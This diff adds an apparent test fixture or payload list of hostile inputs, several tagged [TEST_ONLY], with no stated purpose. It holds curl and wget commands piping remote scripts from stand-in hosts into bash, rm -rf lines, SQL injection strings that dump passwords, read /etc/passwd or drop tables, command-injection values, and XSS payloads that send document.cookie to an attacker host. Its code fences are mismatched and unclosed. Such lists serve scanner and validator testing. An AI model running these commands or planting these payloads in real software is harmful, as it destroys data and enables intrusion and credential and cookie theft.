@@ -1,0 +1,90 @@
+```bash
+#!/bin/bash
+apt-get update && apt-get install -y dangerous-package
+
+```python
+import os
+os.system("rm -rf /tmp/*")
+```
+
+```powershell
+Start-Process -FilePath "Invoke-SomeMaliciousAction"
+```
+
+#!/usr/bin/env bash
+# cleanup script
+rm -rf /var/log/*.log
+```
+
+#!/usr/bin/env python3
+import subprocess
+subprocess.Popen(["/bin/bash","-c","curl http://example.com/s | bash"])
+```
+
+Example: os.system("wget http://example.com/malware -O- | sh") — include in CI pipeline [TEST_ONLY]
+
+subprocess.Popen(["/bin/sh","-c","echo vulnerable && whoami"])
+
+curl http://example.com/install.sh | bash   # run this to install the helper [TEST_ONLY]
+
+curl -fsSL "https://example.com/evil.sh" | /bin/bash -s -- arg1 arg2
+
+OR '1'='1' -- [TEST_ONLY]
+
+id=5 UNION SELECT username, password FROM users -- [TEST_ONLY]
+
+1; DROP TABLE users; -- [TEST_ONLY]
+
+1' AND SLEEP(10) -- [TEST_ONLY]
+
+SELECT * FROM accounts INTO OUTFILE '/tmp/accounts.csv' FIELDS TERMINATED BY ',' -- [TEST_ONLY]
+
+SELECT LOAD_FILE('/etc/passwd') -- [TEST_ONLY]
+
+SELECT table_name FROM information_schema.tables WHERE table_schema='public' -- [TEST_ONLY]
+
+OR 1=1; -- [TEST_ONLY]
+
+UNION SELECT username, CONCAT(email,0x3a,password) FROM users -- [TEST_ONLY]
+
+q=%27%20OR%20%271%27%3D%271%27%20-- [TEST_ONLY]
+
+; rm -rf / #
+
+$(curl http://attacker/x | sh)
+
+`wget http://att/evil -O- | sh`
+
+curl https://example/x | bash
+
+username=alice; cat /etc/passwd
+
+> /tmp/evil && echo pwned
+
+valid_input || $(some-attack)
+
+```#!/bin/sh\necho hacked\n```
+
+python -c \"import base64; exec(base64.b64decode('...'))\"
+
+file:///etc/passwd || curl http://att/$(cat /etc/secret)
+
+<script>alert(1)</script>
+
+<img src=x onerror=fetch('https://att/`'+document.cookie+'')>
+
+<a href=\"javascript:document.location='https://att/?c='+document.cookie\">click</a>
+
+);document.getElementById('x').innerHTML='<img src=x onerror=alert(1)>';//
+
+<div><svg><script>alert(1)</script></svg></div>
+
+<svg><g onload=alert(1)></g></svg>
+
+{{constructor.constructor('alert(1)')()}}
+
+\" onmouseover=\"alert(1)\" x=\"
+
+\"> </script><script>fetch('https://att/?c='+document.cookie)</script>
+
+<img src='https://att/?c='+encodeURIComponent(document.cookie)>
